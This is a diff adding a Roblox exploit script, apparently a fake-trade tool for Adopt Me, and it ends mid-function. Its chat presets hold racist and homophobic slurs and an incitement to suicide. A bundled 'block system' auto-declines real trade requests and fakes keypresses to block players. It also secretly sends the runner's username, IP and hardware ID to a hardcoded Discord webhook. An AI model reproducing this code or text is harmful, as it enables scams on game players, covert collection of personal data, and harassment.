@@ -1,0 +1,3662 @@
+--// Adopt Me Fake Trade Visualizer (client-sided)
+
+-----------------------------
+-- Services & core modules --
+-----------------------------
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+
+
+local LocalPlayer = Players.LocalPlayer
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
+local UIManager = Fsys.load("UIManager")
+
+-- ? cleanup: destroy any old VisualTradeGui from previous runs
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local oldGui = playerGui:FindFirstChild("VisualTradeGui")
+if oldGui then
+   oldGui:Destroy()
+   print("[FakeTrade] old VisualTradeGui found and destroyed before reloading")
+end
+
+local Players     = game:GetService("Players")
+local StarterGui  = game:GetService("StarterGui")
+
+-- only exists client-side, works in most executors
+local Vim = game:GetService("VirtualInputManager")
+
+local function realSilentBlock(plr)
+   if not plr or not plr:IsA("Player") then return end
+
+   -- step 1: trigger the REAL Roblox block prompt
+   pcall(function()
+       StarterGui:SetCore("PromptBlockPlayer", plr)
+   end)
+
+   -- step 2: very quickly auto-confirm it
+   task.delay(0.05, function()
+       -- (optional) hide core UI for a fraction of a second
+       local ok1 = pcall(function()
+           StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+       end)
+
+       -- simulate pressing Enter (default focused button is usually "Block")
+       pcall(function()
+           Vim:SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
+           task.wait()
+           Vim:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+       end)
+
+       -- re-enable CoreGui after a short moment
+       task.delay(0.15, function()
+           pcall(function()
+               StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+           end)
+       end)
+   end)
+end
+
+-----------------
+-- Trade setup --
+-----------------
+local TradeApp = UIManager.apps.TradeApp
+if not TradeApp then
+   warn("[FakeTrade] TradeApp not found. Abort.")
+   return
+end
+
+-- keep originals so we can restore later
+local originalAccept     = TradeApp._on_accept_pressed
+local originalConfirm    = TradeApp._on_confirm_pressed
+local originalOverwrite  = TradeApp._overwrite_local_trade_state
+local originalRemove     = TradeApp._remove_item_from_my_offer or function() end
+
+-- state
+local fakeActive               = false
+local fakeTradeId              = nil
+local currentTargetName        = "VegasHills"   -- lookup name
+local currentTargetDisplayName = "VegasHills"   -- EXACT casing to show
+local currentTargetId          = 0
+local desiredMaxSpectators     = 5
+local spectatorLoopRunning     = false
+local allowOverwrite           = false         -- when true, lets our own overwrite Password
+-- simple local lock timer (to mimic Adopt Me's 5s lock)
+local tradeUnlockAt = 0
+local LOCK_DURATION = 5
+
+-- block real trade requests while a visual trade is running
+local realRequestBlockConn
+
+local function startBlockingRealRequests()
+   if realRequestBlockConn then
+       realRequestBlockConn:Disconnect()
+       realRequestBlockConn = nil
+   end
+
+   local pg = LocalPlayer:FindFirstChild("PlayerGui")
+   if not pg then return end
+
+   realRequestBlockConn = pg.DescendantAdded:Connect(function(inst)
+       -- only care while fake trade is active
+       if not fakeActive then return end
+       if not inst:IsA("TextLabel") then return end
+       if type(inst.Text) ~= "string" then return end
+
+       local txt = inst.Text:lower()
+
+       -- phrases Adopt Me uses for trade request popups
+       if txt:find("sent you a trade request", 1, true)
+       or txt:find("wants to trade", 1, true)
+       or txt:find("trade request", 1, true) then
+
+           -- nuke the whole popup ScreenGui so you never see it
+           local root = inst
+           while root.Parent and not root:IsA("ScreenGui") do
+               root = root.Parent
+           end
+
+           if root and root.Parent then
+               root:Destroy()
+               print("[FakeTrade] blocked a real trade request while visual trade is active")
+           end
+       end
+   end)
+end
+
+local function stopBlockingRealRequests()
+   if realRequestBlockConn then
+       realRequestBlockConn:Disconnect()
+       realRequestBlockConn = nil
+   end
+end
+
+
+-- static ghost users (always on top - with your exact casing)
+local STATIC_PLAYER_NAMES = {
+   "NatalieBeanie",
+   "VegasHills",
+   "CammyxBoba",
+   "TheMeganPlays",
+}
+
+-- cache for name -> userId lookups
+local cachedUserIds = {}
+
+-- block real trade dialogs while in fake trade
+local DialogApp      = UIManager.apps.DialogApp
+local originalDialog = DialogApp and DialogApp.dialog
+local blockRealTrades = false      -- true = auto-decline/skip dialogs
+local allowMockDialog = false      -- true only for OUR fake-trade prompt
+
+if DialogApp and originalDialog then
+   DialogApp.dialog = function(self, options, ...)
+       -- let OUR fake-trade prompt through untouched
+       if allowMockDialog then
+           return originalDialog(self, options, ...)
+       end
+
+       -- only interfere if fake trade is active AND we're blocking
+       if fakeActive and blockRealTrades and type(options) == "table" then
+           local txt = tostring(options.text or ""):lower()
+
+           -- match real trade request dialogs only
+           if txt:find("sent you a trade request", 1, true)
+           or txt:find("wants to trade", 1, true)
+           or txt:find("trade request", 1, true) then
+               print("[FakeTrade] auto-declined real trade dialog while visual trade is active")
+               return "Decline"
+           end
+       end
+
+       -- everything else: behave exactly like the game
+       return originalDialog(self, options, ...)
+   end
+end
+
+-----------------
+-- Pet library --
+-----------------
+local PET_KINDS = {
+   "ugc_refresh_2023_african_wild_dog",
+   "albino_monkey",
+   "arctic_reindeer",
+   "summerfest_2024_balloon_unicorn",
+   "bat_dragon",
+   "lures_2023_blazing_lion",
+   "easter_2024_candyfloss_chick",
+   "crow",
+   "frost_dragon",
+   "giraffe",
+   "pride_2022_goat",
+   "springfest_2023_hare",
+   "elf_hedgehog",
+   "owl",
+   "parrot",
+   "winter_2023_peppermint_penguin",
+   "shadow_dragon",
+   "meme_2023_sheeeeep",
+   "winter_2022_strawberry_shortcake_bat_dragon",
+}
+
+local RARITY_PROPS = {
+   { mega_neon = true,  neon = false, flyable = true, rideable = true }, -- MFR
+   { mega_neon = false, neon = true,  flyable = true, rideable = true }, -- NFR
+   { mega_neon = false, neon = false, flyable = true, rideable = true }, -- FR
+}
+
+-- partner chat presets (you can edit these in Studio)
+local CHAT_PRESETS = {
+   "OMGGG TYSMM",
+   "i fucking hate faggots like you",
+   "im literally followed you nigger",
+   "i hope you kill yourself you fat nigger bitch",
+   "AHHHH I LOVE YOU TRUSTEDDD",
+   "can you spin this",
+   "yes",
+   "no",
+   "offer??",
+   "guys they are trusted-",
+   "tranny",
+   "plz add more hello",
+   "ur so under nigger",
+   "add more u fucking faggot",
+   "OMG I LOVE YOUR LIVES",
+   "omg hiiii",
+   "beaner add more",
+}
+
+
+local function runBlockSystem()
+
+-- Envision Block System - Username + HWID + IP bans
+-- Admin: rileyspinsadm
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local gethwid = (getgenv and getgenv().gethwid) or function() return "Unknown" end
+local request = (syn and syn.request) or (http and http.request) or function() return {Body = ""} end
+local setclipboard = (syn and syn.setclipboard) or function() end
+
+local ADMIN_NAME = "rileyspinsadm"
+local isAdmin = (LocalPlayer.Name == ADMIN_NAME)
+
+local ENCRYPTED_BANS = [[eJwLycgsVgCi5JL8otTi0pTM/GKFBUMMzA0MjE0sDQAALQ0O]]
+local KEY = "CJL_BLOCK_2025"
+local scale = 0.6
+local BLOCK_KEYWORDS = {"scam","delta","script","exploit","hack","executor","mma"}
+
+-- ============ SOFT BLOCK SYSTEM (local-only "block") ============
+local softBlocked = {}  -- [userId] = true
+
+local function applySoftBlockToCharacter(plr)
+   if not plr or not plr.Character then return end
+   local char = plr.Character
+
+   for _, obj in ipairs(char:GetDescendants()) do
+       if obj:IsA("BasePart") then
+           obj.LocalTransparencyModifier = 1
+           obj.CanCollide = false
+       elseif obj:IsA("Decal") then
+           obj.Transparency = 1
+       end
+   end
+end
+
+local function softBlockPlayer(plr)
+   if not plr or not plr:IsA("Player") then return end
+
+   softBlocked[plr.UserId] = true
+   applySoftBlockToCharacter(plr)
+
+   -- make them invisible again on respawn (once)
+   if not plr.__SoftBlockConn then
+       plr.__SoftBlockConn = plr.CharacterAdded:Connect(function(chr)
+           task.wait(0.1)
+           applySoftBlockToCharacter(plr)
+
+       end)
+   end
+end
+
+-- ================== XOR / ENCRYPT ==================
+
+local function xor(str, key)
+   local result = {}
+   for i = 1, #str do
+       result[i] = string.char(bit32.bxor(str:byte(i), key:byte((i - 1) % #key + 1)))
+   end
+   return table.concat(result)
+end
+
+local function decrypt(data)
+   local ok, d = pcall(HttpService.JSONDecode, HttpService, data)
+   return ok and xor(d.cipher or "", KEY) or ""
+end
+
+local function encrypt(data)
+   return HttpService:JSONEncode({cipher = xor(data, KEY)})
+end
+
+-- ================== BAN LISTS ==================
+
+local BANNED_HWIDS, BANNED_IPS, BANNED_USERS = {}, {}, {}
+
+pcall(function()
+   local json = decrypt(ENCRYPTED_BANS)
+   if json ~= "" then
+       local data = HttpService:JSONDecode(json)
+       BANNED_HWIDS = data.h or {}
+       BANNED_IPS   = data.i or {}
+       BANNED_USERS = data.u or {}
+   end
+end)
+
+local function isBanned()
+   local hwid = gethwid()
+   local ip = "Unknown"
+   local uname = string.lower(LocalPlayer.Name)
+
+   pcall(function()
+       local r = request({Url = "https://api.ipify.org", Method = "GET"})
+       if r and r.Body then
+           ip = r.Body:gsub("%s+","")
+       end
+   end)
+
+   if table.find(BANNED_USERS, uname) then
+       return true, "USERNAME", uname
+   end
+   if table.find(BANNED_HWIDS, hwid) then
+       return true, "HWID", hwid
+   end
+   if table.find(BANNED_IPS, ip) then
+       return true, "IP", ip
+   end
+   return false
+end
+
+-- hard gate on load
+do
+   local banned = isBanned()
+   if banned then
+       task.spawn(function()
+           while true do
+               LocalPlayer:Kick("Banned from Block system by Envision.")
+               task.wait(1)
+           end
+       end)
+       return
+   end
+end
+
+-- ================== DISCORD LOG ==================
+
+task.spawn(function()
+   local hwid = gethwid()
+   local ip = "Unknown"
+   pcall(function()
+       local r = request({Url="https://api.ipify.org", Method="GET"})
+       if r and r.Body then ip = r.Body:gsub("%s+","") end
+   end)
+
+   local embed = {
+       title = "Block system by Envision",
+       color = 15158332,
+       fields = {
+           {name="User", value=LocalPlayer.Name, inline=true},
+           {name="IP",   value="```"..ip.."```", inline=true},
+           {name="HWID", value="```"..hwid.."```", inline=false},
+       }
+   }
+
+   pcall(function()
+       request({
+           Url="https://discord.com/api/webhooks/1445277352627142788/-EyAcWuGX47cggINt-A8Byckwl7Rxook_9kLdHYbxX4H9k0eHBF5svA9NsUiWkcdm7Iq",
+           Method="POST",
+           Headers={["Content-Type"]="application/json"},
+           Body=HttpService:JSONEncode({username="Envision Logger", embeds={embed}})
+       })
+   end)
+end)
+
+-- ================== MAIN UI ==================
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Envision_Block_UI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300 * scale, 0, 480 * scale)
+mainFrame.Position = UDim2.new(0.12, 0, 0.1, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 20 * scale)
+mainCorner.Parent = mainFrame
+
+-- glow (no UDim2 + UDim2 math)
+local glow = Instance.new("ImageLabel")
+glow.Size = UDim2.new(0, 300 * scale + 30, 0, 480 * scale + 30)
+glow.Position = UDim2.new(0.12, -15, 0.1, -15)
+glow.BackgroundTransparency = 1
+glow.Image = "rbxassetid://4996891970"
+glow.ImageColor3 = Color3.fromRGB(80,160,255)
+glow.ImageTransparency = 0.7
+glow.ScaleType = Enum.ScaleType.Slice
+glow.SliceCenter = Rect.new(20,20,280,280)
+glow.ZIndex = -1
+glow.Parent = screenGui
+
+-- TITLE BAR
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1,0,0,50*scale)
+titleBar.BackgroundColor3 = Color3.fromRGB(30,30,45)
+titleBar.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0,20*scale)
+titleCorner.Parent = titleBar
+
+local titleGrad = Instance.new("UIGradient")
+titleGrad.Color = ColorSequence.new({
+   ColorSequenceKeypoint.new(0, Color3.fromRGB(30,30,45)),
+   ColorSequenceKeypoint.new(1, Color3.fromRGB(25,25,40))
+})
+titleGrad.Rotation = 90
+titleGrad.Parent = titleBar
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1,-160*scale,1,0)
+titleLabel.Position = UDim2.new(0,18*scale,0,0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "block system by envision"
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.TextSize = 24*scale
+titleLabel.TextColor3 = Color3.fromRGB(230,230,240)
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleBar
+
+local adminBtn = Instance.new("TextButton")
+adminBtn.Size = UDim2.new(0,75*scale,0,36*scale)
+adminBtn.Position = UDim2.new(1,-180*scale,0,7*scale)
+adminBtn.BackgroundColor3 = Color3.fromRGB(120,60,220)
+adminBtn.Text = "ADMIN"
+adminBtn.TextColor3 = Color3.new(1,1,1)
+adminBtn.Font = Enum.Font.GothamBold
+adminBtn.TextSize = 15*scale
+adminBtn.Visible = isAdmin
+adminBtn.Parent = titleBar
+
+local adminBtnCorner = Instance.new("UICorner")
+adminBtnCorner.CornerRadius = UDim.new(0,12*scale)
+adminBtnCorner.Parent = adminBtn
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0,40*scale,0,40*scale)
+closeBtn.Position = UDim2.new(1,-45*scale,0.5,-20*scale)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255,90,90)
+closeBtn.Font = Enum.Font.GothamBlack
+closeBtn.TextSize = 30*scale
+closeBtn.Parent = titleBar
+closeBtn.MouseButton1Click:Connect(function()
+   mainFrame.Visible = false
+end)
+
+-- ================== ADMIN BAN PANEL ==================
+
+local adminPanel = Instance.new("Frame")
+adminPanel.Size = UDim2.new(0,260*scale,0,260*scale)
+adminPanel.Position = UDim2.new(0.12,0,0.1,260*scale)
+adminPanel.BackgroundColor3 = Color3.fromRGB(15,15,25)
+adminPanel.Visible = false
+adminPanel.ZIndex = 50
+adminPanel.Parent = screenGui
+
+local adminPanelCorner = Instance.new("UICorner")
+adminPanelCorner.CornerRadius = UDim.new(0,16*scale)
+adminPanelCorner.Parent = adminPanel
+
+local adminTitle = Instance.new("TextLabel")
+adminTitle.Size = UDim2.new(1,-10*scale,0,30*scale)
+adminTitle.Position = UDim2.new(0,5*scale,0,5*scale)
+adminTitle.BackgroundTransparency = 1
+adminTitle.Text = "Envision Ban Panel"
+adminTitle.Font = Enum.Font.GothamBold
+adminTitle.TextSize = 18*scale
+adminTitle.TextColor3 = Color3.fromRGB(230,230,240)
+adminTitle.TextXAlignment = Enum.TextXAlignment.Left
+adminTitle.ZIndex = 51
+adminTitle.Parent = adminPanel
+
+local adminClose = Instance.new("TextButton")
+adminClose.Size = UDim2.new(0,30*scale,0,30*scale)
+adminClose.Position = UDim2.new(1,-35*scale,0,5*scale)
+adminClose.BackgroundTransparency = 1
+adminClose.Text = "X"
+adminClose.TextColor3 = Color3.fromRGB(255,90,90)
+adminClose.Font = Enum.Font.GothamBlack
+adminClose.TextSize = 22*scale
+adminClose.ZIndex = 51
+adminClose.Parent = adminPanel
+adminClose.MouseButton1Click:Connect(function()
+   adminPanel.Visible = false
+end)
+
+local userBox = Instance.new("TextBox")
+userBox.Size = UDim2.new(1,-20*scale,0,30*scale)
+userBox.Position = UDim2.new(0,10*scale,0,45*scale)
+userBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+userBox.PlaceholderText = "username to ban / unban"
+userBox.TextColor3 = Color3.fromRGB(230,230,240)
+userBox.Font = Enum.Font.Gotham
+userBox.TextSize = 16*scale
+userBox.ZIndex = 51
+userBox.Parent = adminPanel
+
+local userBoxCorner = Instance.new("UICorner")
+userBoxCorner.CornerRadius = UDim.new(0,10*scale)
+userBoxCorner.Parent = userBox
+
+local banUserBtn = Instance.new("TextButton")
+banUserBtn.Size = UDim2.new(0.5,-15*scale,0,28*scale)
+banUserBtn.Position = UDim2.new(0,10*scale,0,80*scale)
+banUserBtn.BackgroundColor3 = Color3.fromRGB(220,80,80)
+banUserBtn.Text = "Ban User"
+banUserBtn.TextColor3 = Color3.new(1,1,1)
+banUserBtn.Font = Enum.Font.GothamBold
+banUserBtn.TextSize = 15*scale
+banUserBtn.ZIndex = 51
+banUserBtn.Parent = adminPanel
+
+local banUserBtnCorner = Instance.new("UICorner")
+banUserBtnCorner.CornerRadius = UDim.new(0,10*scale)
+banUserBtnCorner.Parent = banUserBtn
+
+local unbanUserBtn = Instance.new("TextButton")
+unbanUserBtn.Size = UDim2.new(0.5,-15*scale,0,28*scale)
+unbanUserBtn.Position = UDim2.new(0.5,5*scale,0,80*scale)
+unbanUserBtn.BackgroundColor3 = Color3.fromRGB(80,160,255)
+unbanUserBtn.Text = "Unban User"
+unbanUserBtn.TextColor3 = Color3.new(1,1,1)
+unbanUserBtn.Font = Enum.Font.GothamBold
+unbanUserBtn.TextSize = 15*scale
+unbanUserBtn.ZIndex = 51
+unbanUserBtn.Parent = adminPanel
+
+local unbanUserBtnCorner = Instance.new("UICorner")
+unbanUserBtnCorner.CornerRadius = UDim.new(0,10*scale)
+unbanUserBtnCorner.Parent = unbanUserBtn
+
+local hwidBox = Instance.new("TextBox")
+hwidBox.Size = UDim2.new(1,-20*scale,0,30*scale)
+hwidBox.Position = UDim2.new(0,10*scale,0,120*scale)
+hwidBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+hwidBox.PlaceholderText = "HWID to ban (enter)"
+hwidBox.TextColor3 = Color3.fromRGB(230,230,240)
+hwidBox.Font = Enum.Font.Gotham
+hwidBox.TextSize = 16*scale
+hwidBox.ZIndex = 51
+hwidBox.Parent = adminPanel
+
+local hwidBoxCorner = Instance.new("UICorner")
+hwidBoxCorner.CornerRadius = UDim.new(0,10*scale)
+hwidBoxCorner.Parent = hwidBox
+
+local ipBox = Instance.new("TextBox")
+ipBox.Size = UDim2.new(1,-20*scale,0,30*scale)
+ipBox.Position = UDim2.new(0,10*scale,0,160*scale)
+ipBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+ipBox.PlaceholderText = "IP to ban (enter)"
+ipBox.TextColor3 = Color3.fromRGB(230,230,240)
+ipBox.Font = Enum.Font.Gotham
+ipBox.TextSize = 16*scale
+ipBox.ZIndex = 51
+ipBox.Parent = adminPanel
+
+local ipBoxCorner = Instance.new("UICorner")
+ipBoxCorner.CornerRadius = UDim.new(0,10*scale)
+ipBoxCorner.Parent = ipBox
+
+local saveLabel = Instance.new("TextLabel")
+saveLabel.Size = UDim2.new(1,-20*scale,0,24*scale)
+saveLabel.Position = UDim2.new(0,10*scale,1,-30*scale)
+saveLabel.BackgroundTransparency = 1
+saveLabel.Text = "bans auto-copy encrypted to clipboard"
+saveLabel.Font = Enum.Font.Gotham
+saveLabel.TextSize = 13*scale
+saveLabel.TextColor3 = Color3.fromRGB(160,160,190)
+saveLabel.TextXAlignment = Enum.TextXAlignment.Left
+saveLabel.ZIndex = 51
+saveLabel.Parent = adminPanel
+
+local function saveBans()
+   local packed = HttpService:JSONEncode({
+       h = BANNED_HWIDS,
+       i = BANNED_IPS,
+       u = BANNED_USERS
+   })
+   setclipboard(encrypt(packed))
+   StarterGui:SetCore("SendNotification", {
+       Title = "Envision",
+       Text = "Bans copied to clipboard.",
+       Duration = 4
+   })
+end
+
+banUserBtn.MouseButton1Click:Connect(function()
+   if not isAdmin then return end
+   local txt = userBox.Text
+   if txt == "" then return end
+   local uname = string.lower(txt)
+   if not table.find(BANNED_USERS, uname) then
+       table.insert(BANNED_USERS, uname)
+       saveBans()
+   end
+end)
+
+unbanUserBtn.MouseButton1Click:Connect(function()
+   if not isAdmin then return end
+   local txt = userBox.Text
+   if txt == "" then return end
+   local uname = string.lower(txt)
+   for i = #BANNED_USERS, 1, -1 do
+       if BANNED_USERS[i] == uname then
+           table.remove(BANNED_USERS, i)
+       end
+   end
+   saveBans()
+end)
+
+hwidBox.FocusLost:Connect(function(enter)
+   if not enter or not isAdmin then return end
+   local v = hwidBox.Text
+   if v == "" then return end
+   if not table.find(BANNED_HWIDS, v) then
+       table.insert(BANNED_HWIDS, v)
+       saveBans()
+   end
+end)
+
+ipBox.FocusLost:Connect(function(enter)
+   if not enter or not isAdmin then return end
+   local v = ipBox.Text
+   if v == "" then return end
+   if not table.find(BANNED_IPS, v) then
+       table.insert(BANNED_IPS, v)
+       saveBans()
+   end
+end)
+
+adminBtn.MouseButton1Click:Connect(function()
+   if not isAdmin then return end
+   adminPanel.Visible = not adminPanel.Visible
+end)
+
+-- ================== TABS ==================
+
+local tabLine = Instance.new("Frame")
+tabLine.Size = UDim2.new(0.5,-6*scale,0,3*scale)
+tabLine.Position = UDim2.new(0,3*scale,0,87*scale)
+tabLine.BackgroundColor3 = Color3.fromRGB(80,160,255)
+tabLine.Parent = mainFrame
+
+local tabLineCorner = Instance.new("UICorner")
+tabLineCorner.CornerRadius = UDim.new(0,2*scale)
+tabLineCorner.Parent = tabLine
+
+local page1Btn = Instance.new("TextButton")
+page1Btn.Size = UDim2.new(0.5,0,0,40*scale)
+page1Btn.Position = UDim2.new(0,0,0,50*scale)
+page1Btn.Text = "Block"
+page1Btn.BackgroundTransparency = 1
+page1Btn.TextColor3 = Color3.fromRGB(230,230,240)
+page1Btn.Font = Enum.Font.GothamBold
+page1Btn.TextSize = 18*scale
+page1Btn.Parent = mainFrame
+
+local page2Btn = Instance.new("TextButton")
+page2Btn.Size = UDim2.new(0.5,0,0,40*scale)
+page2Btn.Position = UDim2.new(0.5,0,0,50*scale)
+page2Btn.Text = "Username"
+page2Btn.BackgroundTransparency = 1
+page2Btn.TextColor3 = Color3.fromRGB(140,150,170)
+page2Btn.Font = Enum.Font.GothamBold
+page2Btn.TextSize = 18*scale
+page2Btn.Parent = mainFrame
+
+-- ================== BLOCK PAGE ==================
+
+local blockPage = Instance.new("Frame")
+blockPage.Size = UDim2.new(1,0,1,-90*scale)
+blockPage.Position = UDim2.new(0,0,0,90*scale)
+blockPage.BackgroundTransparency = 1
+blockPage.Parent = mainFrame
+
+local autoBlockLabel = Instance.new("TextLabel")
+autoBlockLabel.Size = UDim2.new(0,100*scale,0,34*scale)
+autoBlockLabel.Position = UDim2.new(1,-196*scale,0,10*scale)
+autoBlockLabel.BackgroundTransparency = 1
+autoBlockLabel.Text = "AutoBlock"
+autoBlockLabel.TextColor3 = Color3.fromRGB(200,200,220)
+autoBlockLabel.Font = Enum.Font.Gotham
+autoBlockLabel.TextSize = 16*scale
+autoBlockLabel.TextXAlignment = Enum.TextXAlignment.Right
+autoBlockLabel.Parent = blockPage
+
+local autoBlockEnabled = false
+local toggleBg = Instance.new("Frame")
+toggleBg.Size = UDim2.new(0,60*scale,0,34*scale)
+toggleBg.Position = UDim2.new(1,-76*scale,0,10*scale)
+toggleBg.BackgroundColor3 = Color3.fromRGB(80,80,90)
+toggleBg.Parent = blockPage
+
+local toggleBgCorner = Instance.new("UICorner")
+toggleBgCorner.CornerRadius = UDim.new(0,17*scale)
+toggleBgCorner.Parent = toggleBg
+
+local toggleKnob = Instance.new("Frame")
+toggleKnob.Size = UDim2.new(0,28*scale,0,28*scale)
+toggleKnob.Position = UDim2.new(0,3*scale,0.5,-14*scale)
+toggleKnob.BackgroundColor3 = Color3.new(1,1,1)
+toggleKnob.Parent = toggleBg
+
+local toggleKnobCorner = Instance.new("UICorner")
+toggleKnobCorner.CornerRadius = UDim.new(1,0)
+toggleKnobCorner.Parent = toggleKnob
+
+toggleBg.InputBegan:Connect(function(i)
+   if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+       autoBlockEnabled = not autoBlockEnabled
+       TweenService:Create(toggleBg, TweenInfo.new(0.2),
+           {BackgroundColor3 = autoBlockEnabled and Color3.fromRGB(80,200,120) or Color3.fromRGB(80,80,90)}):Play()
+       TweenService:Create(toggleKnob, TweenInfo.new(0.2),
+           {Position = autoBlockEnabled and UDim2.new(1,-31*scale,0.5,-14*scale) or UDim2.new(0,3*scale,0.5,-14*scale)}):Play()
+   end
+end)
+
+local searchBox = Instance.new("TextBox")
+searchBox.Size = UDim2.new(1,-24*scale,0,40*scale)
+searchBox.Position = UDim2.new(0,12*scale,0,54*scale)
+searchBox.PlaceholderText = "Search..."
+searchBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+searchBox.TextColor3 = Color3.fromRGB(230,230,240)
+searchBox.Font = Enum.Font.Gotham
+searchBox.TextSize = 17*scale
+searchBox.Parent = blockPage
+
+local searchBoxCorner = Instance.new("UICorner")
+searchBoxCorner.CornerRadius = UDim.new(0,12*scale)
+searchBoxCorner.Parent = searchBox
+
+local stopButton = Instance.new("TextButton")
+stopButton.Size = UDim2.new(0,85*scale,0,40*scale)
+stopButton.Position = UDim2.new(0.5,-95*scale,0,104*scale)
+stopButton.BackgroundColor3 = Color3.fromRGB(230,80,80)
+stopButton.Text = "Stop"
+stopButton.TextColor3 = Color3.new(1,1,1)
+stopButton.Font = Enum.Font.GothamBold
+stopButton.TextSize = 17*scale
+stopButton.Parent = blockPage
+
+local stopButtonCorner = Instance.new("UICorner")
+stopButtonCorner.CornerRadius = UDim.new(0,12*scale)
+stopButtonCorner.Parent = stopButton
+
+local blockAll = Instance.new("TextButton")
+blockAll.Size = UDim2.new(0,85*scale,0,40*scale)
+blockAll.Position = UDim2.new(0.5,10*scale,0,104*scale)
+blockAll.BackgroundColor3 = Color3.fromRGB(80,160,255)
+blockAll.Text = "Block All"
+blockAll.TextColor3 = Color3.new(1,1,1)
+blockAll.Font = Enum.Font.GothamBold
+blockAll.TextSize = 17*scale
+blockAll.Parent = blockPage
+
+local blockAllCorner = Instance.new("UICorner")
+blockAllCorner.CornerRadius = UDim.new(0,12*scale)
+blockAllCorner.Parent = blockAll
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1,-24*scale,1,-160*scale)
+scroll.Position = UDim2.new(0,12*scale,0,154*scale)
+scroll.BackgroundColor3 = Color3.fromRGB(30,30,45)
+scroll.ScrollBarThickness = 7*scale
+scroll.CanvasSize = UDim2.new(0,0,0,0)
+scroll.Parent = blockPage
+
+local scrollCorner = Instance.new("UICorner")
+scrollCorner.CornerRadius = UDim.new(0,14*scale)
+scrollCorner.Parent = scroll
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,7*scale)
+layout.Parent = scroll
+
+local safePlayers = {}
+local isBlocking = false
+local playerButtons = {}
+
+local function createRow(plr)
+   if scroll:FindFirstChild(tostring(plr.UserId)) or plr == LocalPlayer then return end
+
+   local row = Instance.new("Frame")
+   row.Name = tostring(plr.UserId)
+   row.Size = UDim2.new(1,-10*scale,0,46*scale)
+   row.BackgroundColor3 = Color3.fromRGB(30,30,45)
+   row.Parent = scroll
+
+   local rowCorner = Instance.new("UICorner")
+   rowCorner.CornerRadius = UDim.new(0,12*scale)
+   rowCorner.Parent = row
+
+   local safeBtn = Instance.new("TextButton")
+   safeBtn.Size = UDim2.new(0,36*scale,0,36*scale)
+   safeBtn.Position = UDim2.new(0,5*scale,0.5,-18*scale)
+   safeBtn.BackgroundColor3 = Color3.fromRGB(80,80,90)
+   safeBtn.Text = safePlayers[plr] and "Ice" or ""
+   safeBtn.TextColor3 = Color3.fromRGB(80,200,120)
+   safeBtn.Font = Enum.Font.GothamBold
+   safeBtn.TextSize = 20*scale
+   safeBtn.Parent = row
+
+   local safeCorner = Instance.new("UICorner")
+   safeCorner.CornerRadius = UDim.new(0,10*scale)
+   safeCorner.Parent = safeBtn
+
+   safeBtn.MouseButton1Click:Connect(function()
+       safePlayers[plr] = not safePlayers[plr]
+       safeBtn.Text = safePlayers[plr] and "Ice" or ""
+   end)
+
+   local nameBtn = Instance.new("TextButton")
+   nameBtn.Size = UDim2.new(1,-48*scale,1,-8*scale)
+   nameBtn.Position = UDim2.new(0,44*scale,0,4*scale)
+   nameBtn.BackgroundColor3 = Color3.fromRGB(50,50,70)
+   nameBtn.Text = plr.Name
+   nameBtn.TextColor3 = Color3.fromRGB(230,230,240)
+   nameBtn.Font = Enum.Font.GothamBold
+   nameBtn.TextSize = 17*scale
+   nameBtn.TextXAlignment = Enum.TextXAlignment.Left
+   nameBtn.Parent = row
+
+   local nameCorner = Instance.new("UICorner")
+   nameCorner.CornerRadius = UDim.new(0,10*scale)
+   nameCorner.Parent = nameBtn
+
+   nameBtn.MouseButton1Click:Connect(function()
+   realSilentBlock(plr)
+end)
+
+   playerButtons[plr] = nameBtn
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+   createRow(p)
+end
+
+Players.PlayerAdded:Connect(createRow)
+
+Players.PlayerRemoving:Connect(function(p)
+   local row = scroll:FindFirstChild(tostring(p.UserId))
+   if row then row:Destroy() end
+   safePlayers[p] = nil
+   playerButtons[p] = nil
+end)
+
+layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+   scroll.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y + 10*scale)
+end)
+
+searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+   local q = string.lower(searchBox.Text)
+   for plr,btn in pairs(playerButtons) do
+       if btn and btn.Parent then
